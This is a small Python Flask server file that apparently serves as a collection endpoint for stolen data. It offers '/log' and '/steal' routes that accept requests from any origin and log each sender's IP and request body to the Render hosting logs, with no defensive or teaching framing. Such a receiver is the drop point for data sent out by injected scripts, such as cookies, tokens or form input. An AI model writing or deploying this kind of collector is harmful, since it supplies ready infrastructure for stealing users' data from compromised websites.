from flask import Flask, request, make_response
from flask_cors import CORS
from datetime import datetime
import os

app = Flask(__name__)
CORS(app)  # Allows all origins. You can restrict to specific domains if needed.

@app.route('/log', methods=['POST', 'GET'])
@app.route('/steal', methods=['POST', 'GET'])  # Alias for the same functionality
def log_data():
    ip = request.remote_addr
    data = request.get_data(as_text=True)
    now = datetime.utcnow().isoformat()
    log_line = f"[{now}] {ip} → {data}"

    # Print to stdout so Render logs it
    print(log_line, flush=True)

    response = make_response("Logged", 200)
    response.mimetype = "text/plain"
    return response

@app.route('/')
def index():
    return "Logger is up."

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))  # Required by Render
    app.run(host='0.0.0.0', port=port)
